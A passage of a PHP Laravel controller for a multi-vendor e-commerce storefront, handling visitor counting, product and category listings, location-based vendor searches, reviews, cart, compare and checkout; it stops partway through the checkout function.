<?php

namespace App\Http\Controllers;

use App\Models\State;
use App\Models\Advertise;
use App\Models\Banner;
use App\Models\Blog;
use App\Models\Brand;
use App\Models\Jazzcash;
use App\Models\EaseyPasa;
use App\Models\Head;
use App\Models\NewUpdate;
use App\Models\Cart;
use App\Models\Category;
use App\Models\Childcategory;
use App\Classes\GeniusMailer;
use App\Models\Compare;
use App\Models\Conversation;
use App\Models\Counter;
use App\Models\Coupon;
use App\Models\Currency;
use App\Models\Frenchise;
use App\Models\Faq;
use App\Models\Generalsetting;
use App\Models\Image;
use App\Models\Language;
use App\Models\Message;
use App\Models\VendorSubscription;
use App\Models\Notification;
use App\Models\FrenchiseNotification;
use App\Models\Order;
use App\Models\Country;
use App\Models\Page;
use App\Models\Pagesetting;
use App\Models\PaymentGateway;
use App\Models\Pickup;
use App\Models\Portfolio;
use App\Models\Product;
use App\Models\ProductClick;
use App\Models\Review;
use App\Models\Service;
use App\Models\Slider;
use App\Models\Subcategory;
use App\Models\Subscriber;
use App\Models\User;
use App\Models\UserSubscription;
use App\Models\UserNotification;
use App\Models\Vendororder;
use Auth;
use Hash;
use Captcha;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Illuminate\Support\Str;

use DB;

use function GuzzleHttp\Promise\all;
use function Symfony\Component\String\b;

class FrontendController extends Controller
{
    public function __construct()
    {
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']) {

                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
                if ($brwsr->count() > 0) {
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count'] = $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                } else {
                    $newbrws = new Counter();
                    $newbrws['referral'] = $this->getOS();
                    $newbrws['type'] = "browser";
                    $newbrws['total_count'] = 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral', $referral);
                if ($count->count() > 0) {
                    $counts = $count->first();
                    $tcount['total_count'] = $counts->total_count + 1;
                    $counts->update($tcount);
                } else {
                    $newcount = new Counter();
                    $newcount['referral'] = $referral;
                    $newcount['total_count'] = 1;
                    $newcount->save();
                }
            }
        } else {
            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
            if ($brwsr->count() > 0) {
                $brwsr = $brwsr->first();
                $tbrwsr['total_count'] = $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            } else {
                $newbrws = new Counter();
                $newbrws['referral'] = $this->getOS();
                $newbrws['type'] = "browser";
                $newbrws['total_count'] = 1;
                $newbrws->save();
            }
        }
    }

    function getOS()
    {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }
        return $os_platform;
    }

    public function index(Request $request)
    {
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            $brands = Brand::all();
            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }

        $ads = Portfolio::all();
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $sls = Slider::first();
        $id1 = $sls->id;
        $sliders = Slider::where('id', '>', $id1)->get();
        $top_shop = User::where('top', '=', 1)->get();
        $nav_shop = User::where('nav_shop', '=', 1)->get();
        $brands   = Brand::all();
        $banner   = Banner::findOrFail(1);
        $services = Service::all();
        $fproducts = Product::where('featured', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $beproducts = Product::where('best', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $tproducts = Product::where('top', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $hproducts = Product::where('hot', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $lproducts = Product::where('latest', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $biproducts = Product::where('big', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $imgs = Image::all();
        $states = State::all();
        $category = Category::take(4)->latest()->get();
        $fcategory = Category::where('type', '1')->take(4)->get();
        return view('front.index', compact('countries', 'states', 'fcategory', 'category', 'top_shop', 'nav_shop', 'ads', 'sls', 'sliders', 'brands', 'banner', 'fproducts', 'beproducts', 'tproducts', 'hproducts', 'lproducts', 'biproducts', 'imgs', 'services'));
    }

    public function index1(Request $request, $id)
    {
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }

        $ads = Portfolio::all();
        $sls = Slider::first();
        $id1 = $sls->id;
        $sliders = Slider::where('id', '>', $id1)->get();
        $brands = Brand::all();
        $banner = Banner::findOrFail(1);
        $services = Service::all();
        $fproducts = Product::where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $beproducts = Product::where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $tproducts = Product::where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $hproducts = Product::where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $lproducts = Product::where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $biproducts = Product::where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $imgs = Image::all();
        $states = State::all();
        return view('front.index1', compact('countries', 'states', 'ads', 'sls', 'sliders', 'brands', 'banner', 'fproducts', 'beproducts', 'tproducts', 'hproducts', 'lproducts', 'biproducts', 'imgs', 'services', 'id'));
    }

    public function extraIndex(Request $request)
    {

        $ads = Portfolio::all();
        $sls = Slider::first();
        $id1 = $sls->id;
        $sliders = Slider::where('id', '>', $id1)->get();
        $brands = Brand::all();
        $banner = Banner::findOrFail(1);
        $services = Service::all();
        $nav_shop = User::where('nav_shop', '=', 1)->get();
        $top_shop_cat = User::where('top_by_category', '=', 1)->take(8)->get();
        $fproducts = Product::where('featured', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $beproducts = Product::where('best', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $tproducts = Product::where('top', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $hproducts = Product::where('hot', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $lproducts = Product::where('latest', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $biproducts = Product::where('big', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(8)->get();
        $imgs = Image::all();
        $category = Category::take(4)->latest()->get();
        $fcategory = Category::where('type', '1')->take(4)->get();
        $wholesalers = User::where('v_type', '=', 1)->take(4)->latest()->get();
        $units = User::where('v_type', '=', 2)->take(4)->latest()->get();
        $factories = User::where('v_type', '=', 3)->take(4)->latest()->get();

        $cate          = Category::where('type', "1")->get();
        foreach ($cate as $key) {
            $key->sub_cate     = Subcategory::where('category_id', $key->id)->get();
            $key->ct_media     = DB::table('type_banner')->where('tb_ct_id', $key->id)->where('tb_status', 1)->first();
            $key->bner_product = Product::where('category_id', $key->id)->take(6)->get();
        }
        $category = Category::latest()->get();
        return view('front.extraindex', compact('factories', 'units', 'wholesalers', 'category', 'top_shop_cat', 'nav_shop', 'ads', 'sls', 'sliders', 'brands', 'banner', 'fproducts', 'beproducts', 'tproducts', 'hproducts', 'lproducts', 'biproducts', 'imgs', 'services', 'cate'));
    }

    public function category_index(Request $request, $id)
    {
        $ads        = Portfolio::all();
        $sls        = Slider::first();
        $id1        = $sls->id;
        $sliders    = Slider::where('id', '>', $id1)->get();
        $brands     = Brand::all();
        $banner     = Banner::findOrFail(1);
        $services   = Service::all();
        $fproducts  = Product::where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $beproducts = Product::where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $tproducts  = Product::where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $hproducts  = Product::where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $lproducts  = Product::where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $biproducts = Product::where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $imgs       = Image::all();

        $cate         = Category::where('type', "1")->first();
        $sub_cate     = Subcategory::where('category_id', $cate->id)->get();
        $ct_media     = DB::table('type_banner')->where('tb_ct_id', $cate->id)->first();
        $bner_product = Product::where('subcategory_id', $id)->take(6)->get();
        return view('front.category_index', compact('ads', 'sls', 'sliders', 'brands', 'banner', 'fproducts', 'beproducts', 'tproducts', 'hproducts', 'lproducts', 'biproducts', 'imgs', 'services', 'cate', 'ct_media', 'bner_product', 'sub_cate'));
    }

    public function lang($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }


    public function comingsoon()
    {
        $newupdate = NewUpdate::findOrFail(1);
        $newupdate->video_id = $this->getvideourl($newupdate->video);
        $vendors = User::where('coming_shop', 1)->get();
        return view('front.comingsoon', compact('newupdate', 'vendors'));
    }
    public function countrieslist(Request $request, $slug)
    {
        $c_banner   = Banner::findOrFail(1);
        $sort = "";
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $cat = Category::where('cat_slug', '=', $slug)->first();
        $vendors = User::where('country', $slug)->get()->pluck('id');
        $cats = Product::where('status', '=', 1)->whereIn('user_id', $vendors)->orderBy('id', 'desc')->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = Product::where('status', '=', 1)->whereIn('user_id', $vendors)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.country', compact('countries', 'states', 'cat', 'cats', 'sort', 'min', 'max', 'c_banner', 'slug'));
        }
        return view('front.country', compact('countries', 'states', 'cat', 'sort', 'cats', 'c_banner', 'slug'));
    }
    public function provinceslist(Request $request, $slug)
    {
        $c_banner   = Banner::findOrFail(1);
        $sort = "";
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $cat = Category::where('cat_slug', '=', $slug)->first();
        $vendors = User::where('state', $slug)->get()->pluck('id');
        $cats = Product::where('status', '=', 1)->whereIn('user_id', $vendors)->orderBy('id', 'desc')->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = Product::where('status', '=', 1)->whereIn('user_id', $vendors)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.country', compact('countries', 'states', 'cat', 'cats', 'sort', 'min', 'max', 'c_banner', 'slug'));
        }
        return view('front.country', compact('countries', 'states', 'cat', 'sort', 'cats', 'c_banner', 'slug'));
    }

    public function citieslist(Request $request, $slug)
    {
        $c_banner   = Banner::findOrFail(1);
        $sort = "";
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $cat = Category::where('cat_slug', '=', $slug)->first();
        $vendors = User::where('city', $slug)->get()->pluck('id');
        $cats = Product::where('status', '=', 1)->whereIn('user_id', $vendors)->orderBy('id', 'desc')->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = Product::where('status', '=', 1)->whereIn('user_id', $vendors)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.country', compact('countries', 'states', 'cat', 'cats', 'sort', 'min', 'max', 'c_banner', 'slug'));
        }
        return view('front.country', compact('countries', 'states', 'cat', 'sort', 'cats', 'c_banner', 'slug'));
    }

    public function cities_shops(Request $request, $slug)
    {
        $sort = "";
        $country = new Country;
        $countries = $country->get_countries();
        $reservedSymbols = ['-', '_', '+', '<', '>', '@', '(', ')', '~'];
        $searchTerm = str_replace($reservedSymbols, ' ', $slug);
        $searchValues = preg_split('/\s+/', $searchTerm, -1, PREG_SPLIT_NO_EMPTY);

        $vendors = User::where(function ($q) use ($searchValues) {
            foreach ($searchValues as $value) {
                $q->orWhere('city', 'like', "%{$value}%")->orWhere('shop_address', 'like', "%{$value}%");
            }
        })->orderBy('id', 'desc')->paginate(12);

        return view('front.roadsearch', compact('countries', 'vendors', 'sort', 'slug'));
    }

    public function getvideourl($url)
    {
        preg_match_all("#(?<=v=|v\/|vi=|vi\/|youtu.be\/)[a-zA-Z0-9_-]{11}#", $url, $matches);
        return $matches[0][0];
    }
    public function advancesearch()
    {
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        return view('front.advancesearch', compact('countries', 'states'));
    }
    public function frenchisealllist(Request $request, $slug)
    {
        $fcitiesd = Frenchise::where('city', $slug)->get();
        $country = new Country;
        $countries = $country->get_countries();
        return view('front.frenchisealllist', compact('countries', 'fcitiesd'));
    }

    public function frenchisevendorlist(Request $request, $id)
    {
        $frenvendor = User::where('frenchise_id', $id)->get();
        $country = new Country;
        $countries = $country->get_countries();
        return view('front.frenchisealllist', compact('countries', 'frenvendor'));
    }

    public function currency($id)
    {
        Session::put('currency', $id);
        return redirect()->back();
    }

    public function category(Request $request, $slug)
    {
        $c_banner   = Banner::findOrFail(1);
        $sort = "";
        $cat = Category::where('cat_slug', 'Like', $slug)->first();
        $country = new Country;
        $countries = $country->get_countries();
        $cats = $cat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);

        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = $cat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.category', compact('countries', 'cat', 'cats', 'sort', 'min', 'max', 'c_banner'));
        }
        return view('front.category', compact('countries', 'cat', 'sort', 'cats', 'c_banner'));
    }

    public function categorysort($slug, $sorted)
    {
        $banner   = Banner::findOrFail(1);
        $sort = $sorted;
        $cat = Category::where('cat_slug', '=', $slug)->first();
        if ($sort == "new") {
            $cats = $cat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        } else if ($sort == "old") {
            $cats = $cat->products()->where('status', '=', 1)->paginate(9);
        } else if ($sort == "low") {
            $cats = $cat->products()->where('status', '=', 1)->orderBy('cprice', 'asc')->paginate(9);
        } else if ($sort == "high") {
            $cats = $cat->products()->where('status', '=', 1)->orderBy('cprice', 'desc')->paginate(9);
        }
        return view('front.category', compact('cat', 'cats', 'sort', 'banner'));
    }

    public function subcategory(Request $request, $slug)
    {
        $sort = "";
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();

        $subcat = Subcategory::where('sub_slug', '=', $slug)->first();
        $subcats = $subcat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $subcats = $subcat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.subcategory', compact('countries', 'states', 'subcat', 'subcats', 'sort', 'min', 'max'));
        }

        return view('front.subcategory', compact('countries', 'states', 'subcat', 'sort', 'subcats'));
    }

    public function subcategorysort($slug, $sorted)
    {
        $sort = $sorted;
        $subcat = Subcategory::where('sub_slug', '=', $slug)->first();
        if ($sort == "new") {
            $subcats = $subcat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        } else if ($sort == "old") {
            $subcats = $subcat->products()->where('status', '=', 1)->paginate(9);
        } else if ($sort == "low") {
            $subcats = $subcat->products()->where('status', '=', 1)->orderBy('cprice', 'asc')->paginate(9);
        } else if ($sort == "high") {
            $subcats = $subcat->products()->where('status', '=', 1)->orderBy('cprice', 'desc')->paginate(9);
        }
        return view('front.subcategory', compact('subcat', 'subcats', 'sort'));
    }

    public function childcategory(Request $request, $slug)
    {
        $sort = "";
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $childcat = Childcategory::where('child_slug', '=', $slug)->first();
        $childcats = $childcat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $childcats = $childcat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.childcategory', compact('countries', 'states', 'childcat', 'childcats', 'sort', 'min', 'max'));
        }

        return view('front.childcategory', compact('countries', 'states', 'childcat', 'childcats', 'sort'));
    }

    public function childcategorysort($slug, $sorted)
    {
        $sort = $sorted;
        $childcat = Childcategory::where('child_slug', '=', $slug)->first();
        if ($sort == "new") {
            $childcats = $childcat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        } else if ($sort == "old") {
            $childcats = $childcat->products()->where('status', '=', 1)->paginate(9);
        } else if ($sort == "low") {
            $childcats = $childcat->products()->where('status', '=', 1)->orderBy('cprice', 'asc')->paginate(9);
        } else if ($sort == "high") {
            $childcats = $childcat->products()->where('status', '=', 1)->orderBy('cprice', 'desc')->paginate(9);
        }
        return view('front.childcategory', compact('childcat', 'childcats', 'sort'));
    }

    public function hotsale(Request $request, $ptype)
    {
        $sort = "";
        $cat = Category::first();
        $cats = Product::where('hot', 1)->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = $cat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.dealsofday', compact('cat', 'cats', 'sort', 'min', 'max', 'ptype'));
        }
        return view('front.dealsofday', compact('cat', 'sort', 'cats', 'ptype'));
    }

    public function dealsofday2(Request $request, $ptype)
    {
        $sort = "";
        $cat = Category::first();
        $cats = Product::where('deal_of_the_day', 1)->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = $cat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.dealsofday', compact('cat', 'cats', 'sort', 'min', 'max', 'ptype'));
        }
        return view('front.dealsofday', compact('cat', 'sort', 'cats', 'ptype'));
    }

    public function latestspecial(Request $request, $ptype)
    {
        $sort = "";
        $cat = Category::first();
        $cats = Product::where('latest', 1)->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = $cat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.dealsofday', compact('cat', 'cats', 'sort', 'min', 'max', 'ptype'));
        }
        return view('front.dealsofday', compact('cat', 'sort', 'cats', 'ptype'));
    }

    public function festival(Request $request, $ptype)
    {
        $f_banners = Banner::whereNotNull('top5')->whereNotNull('top5l')->inRandomOrder()->limit(3)->get();
        $sort = "";
        $cat = Category::first();
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $cats = Product::where('festival', 1)->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = $cat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.dealsofday', compact('countries', 'states', 'cat', 'cats', 'sort', 'min', 'max', 'ptype', 'f_banners'));
        }
        return view('front.dealsofday', compact('countries', 'states', 'cat', 'sort', 'cats', 'ptype', 'f_banners'));
    }

    public function product($id, $slug)
    {
        $product = Product::findOrFail($id);
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        if ($product->size != null) {
            $size = explode(',', $product->size);
        }
        if ($product->color != null) {
            $color = explode(',', $product->color);
        }
        if ($product->size == null) {
            $size = explode(',', $product->size);
        }
        if ($product->color == null) {
            $color = explode(',', $product->color);
        }
        $product->views += 1;
        $product->update();
        $product_click =  new ProductClick;
        $product_click->product_id = $product->id;
        $product_click->date = Carbon::now()->format('Y-m-d');
        $product_click->save();
        $pmeta = $product->tags;
        $vendor = User::where('id', '=', $product->user_id)->first();
        if (!empty($vendor)) {
            return view('front.product', compact('countries', 'states', 'product', 'size', 'pmeta', 'color', 'vendor'));
        }
        return view('front.product', compact('countries', 'states', 'product', 'size', 'pmeta', 'color'));
    }

    public function cart()
    {
        $country = new Country;
        $countries = $country->get_countries();
        if (!Session::has('cart')) {
            return view('front.cart', compact('countries'));
        }
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        $products = $cart->items;
        return view('front.cart', ['products' => $cart->items, 'totalPrice' => $cart->totalPrice, 'countries'=>$countries]);
    }


    public function compare()
    {
        $country = new Country;
        $countries = $country->get_countries();
        if (!Session::has('compare')) {
            return view('front.compare', compact('countries'));
        }
        $oldCompare = Session::get('compare');
        $compare = new Compare($oldCompare);
        $products = $compare->items;
        return view('front.compare', compact('countries','products'));
    }

    public function reviewsubmit(Request $request)
    {
        $ck = 0;
        $orders = Order::where('user_id', '=', $request->user_id)->where('status', '=', 'completed')->get();

        foreach ($orders as $order) {
            $cart = unserialize(gzuncompress(utf8_decode($order->cart)));
            foreach ($cart->items as $product) {
                if ($request->product_id == $product['item']['id']) {
                    $ck = 1;
                    break;
                }
            }
        }
        if ($ck == 1) {
            $user = Auth::guard('customer')->user();
            $prev = Review::where('product_id', '=', $request->product_id)->where('user_id', '=', $user->id)->get();
            if (count($prev) > 0) {
                return redirect()->back()->with('unsuccess', 'You Have Reviewed Already.');
            }
            $review = new Review;
            $review->fill($request->all());
            $review['review_date'] = date('Y-m-d H:i:s');
            $review['created_at'] = date('Y-m-d H:i:s');
            $review->save();
            return redirect()->back()->with('success', 'Your Review Submitted Successfully.');
        } else {
            return redirect()->back()->with('unsuccess', 'Buy This Product First');
        }
    }

    //Submit Review
    public function tags($tag)
    {
        $products = Product::where('tags', 'like', '%' . $tag . '%')
            ->where('status', '=', 1)->paginate(12);
        return view('front.tags', compact('products', 'tag'));
    }

    public function search(Request $request)
    {
        $sort = "";
        $states = State::all();
        $country = new Country;
        $countries = $country->get_countries();
        $slug = $request->product;
        $main_search = $request->product;
        $cat = Category::where('cat_slug', '=', $request->product)->first();
        $cats = Product::where('status', '=', 1)->where('name', 'like', '%' . $request->product . '%')->orderBy('id', 'desc')->paginate(9);
        return view('front.searchproduct', compact('countries', 'states', 'cat', 'sort', 'cats', 'slug', 'main_search'));
    }

    public function searchs(Request $request, $search)
    {
        $sort = "";
        $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
            ->paginate(9);
        $min = $request->min;
        $max = $request->max;
        $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
        return view('front.searchproductprice', compact('sproducts', 'search', 'sort', 'min', 'max'));
    }

    public function searchss(Request $request, $search, $sort)
    {
        if ($sort == "new") {
            if (!empty($request->min) || !empty($request->max)) {
                $min = $request->min;
                $max = $request->max;
                $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->orderBy('id', 'desc')->paginate(9);

                return view('front.searchpricesort', compact('sproducts', 'search', 'sort', 'min', 'max'));
            }
            $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('id', 'desc')->paginate(9);
        } else if ($sort == "old") {
            if (!empty($request->min) || !empty($request->max)) {
                $min = $request->min;
                $max = $request->max;
                $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->paginate(9);

                return view('front.searchpricesort', compact('sproducts', 'search', 'sort', 'min', 'max'));
            }
            $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->paginate(9);
        } else if ($sort == "low") {
            if (!empty($request->min) || !empty($request->max)) {
                $min = $request->min;
                $max = $request->max;
                $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);

                return view('front.searchpricesort', compact('sproducts', 'search', 'sort', 'min', 'max'));
            }
            $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('cprice', 'asc')->paginate(9);
        } else if ($sort == "high") {
            if (!empty($request->min) || !empty($request->max)) {
                $min = $request->min;
                $max = $request->max;
                $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'desc')->paginate(9);

                return view('front.searchpricesort', compact('sproducts', 'search', 'sort', 'min', 'max'));
            }
            $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('cprice', 'desc')->paginate(9);
        }
        return view('front.searchproductsort', compact('sproducts', 'search', 'sort'));
    }

    public function checkout()
    {
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success', "You don't have any product to checkout.");
        }
        if (Session::has('already')) {
            Session::forget('already');
        }
        $gs = Generalsetting::findOrFail(1);
        $dp = 1;

        if (Auth::guard('user')->check()) {
            $gateways =  PaymentGateway::where('status', '=', 1)->get();
            $pickups = Pickup::all();
            $oldCart = Session::get('cart');
            $cart = new Cart($oldCart);
            $products = $cart->items;
            if ($gs->multiple_ship == 1) {
                $user = null;
                foreach ($cart->items as $prod) {
                    $user[] = $prod['item']['user_id'];
                }
                $ship  = 0;
                $users = array_unique($user);
                if (!empty($users)) {
                    foreach ($users as $user) {
                        if ($user != 0) {
                            $nship = User::findOrFail($user);
                            $ship += $nship->shipping_cost;
                        } else {
                            $ship  += $gs->ship;
                        }
                    }
                }
            } else {
                $ship  = $gs->ship;
            }

            foreach ($products as $prod) {
                if ($prod['item']['type'] == 0) {
                    $dp = 0;
                    break;
                }
            }
            if ($dp == 1) {
                $ship  = 0;
            }
            $total = $cart->totalPrice + $ship;
            if ($gs->tax != 0) {
                $tax = ($total / 100) * $gs->tax;
                $total = $total + $tax;
            }
            return view('front.checkout', ['cart'=>$cart, 'products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'digital' => $dp]);
        } else {

            if ($gs->guest_checkout == 1) {
                $gateways =  PaymentGateway::where('status', '=', 1)->get();
                $pickups = Pickup::all();
                $oldCart = Session::get('cart');
                $cart = new Cart($oldCart);
                $products = $cart->items;
                if ($gs->multiple_ship == 1) {
                    $user = null;
                    foreach ($cart->items as $prod) {
                        $user[] = $prod['item']['user_id'];
                    }
                    $ship  = 0;
                    $users = array_unique($user);
                    if (!empty($users)) {
                        foreach ($users as $user) {
                            if ($user != 0) {
                                $nship = User::findOrFail($user);
                                $ship += $nship->shipping_cost;
                            } else {
                                $ship  += $gs->ship;
                            }
                        }
                    }
                } else {
                    $ship  = $gs->ship;
                }
                foreach ($products as $prod) {
                    if ($prod['item']['type'] == 0) {
                        $dp = 0;
                        break;
                    }
                }
                if ($dp == 1) {
                    $ship  = 0;
                }
                $total = $cart->totalPrice + $ship;
                if ($gs->tax != 0) {
                    $tax = ($total / 100) * $gs->tax;
                    $total = $total + $tax;
                }
                foreach ($products as $prod) {
                    if ($prod['item']['type'] != 0) {
                        if (!Auth::guard('user')->check()) {
                            $ck = 1;
                            return view('front.checkout', ['cart'=>$cart, 'products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'checked' => $ck, 'digital' => $dp]);
                        }
                    }
                }
                return view('front.checkout', ['cart'=>$cart, 'products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship, 'digital' => $dp]);
            }


            else {
                $gateways =  PaymentGateway::where('status', '=', 1)->get();
                $pickups = Pickup::all();
                $oldCart = Session::get('cart');
                $cart = new Cart($oldCart);
                $products = $cart->items;
                if ($gs->multiple_ship == 1) {
                    $user = null;
                    foreach ($cart->items as $prod) {
                        $user[] = $prod['item']['user_id'];
                    }
                    $ship  = 0;
                    $users = array_unique($user);
                    if (!empty($users)) {
                        foreach ($users as $user) {
                            if ($user != 0) {
                                $nship = User::findOrFail($user);
